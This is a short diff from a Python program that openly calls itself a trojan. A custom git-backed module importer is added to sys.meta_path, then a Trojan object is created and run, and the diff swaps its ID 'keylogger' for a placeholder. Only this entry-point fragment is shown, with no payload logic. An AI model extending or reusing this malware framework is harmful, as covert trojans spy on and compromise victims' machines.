@@ -99,5 +99,5 @@ class GitImporter:
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())  # 添加自定义模块导入器
-    trojan = Trojan('keylogger')  # 创建木马对象
+    trojan = Trojan('TROJANID')  # 创建木马对象
     trojan.run()  # 运行木马
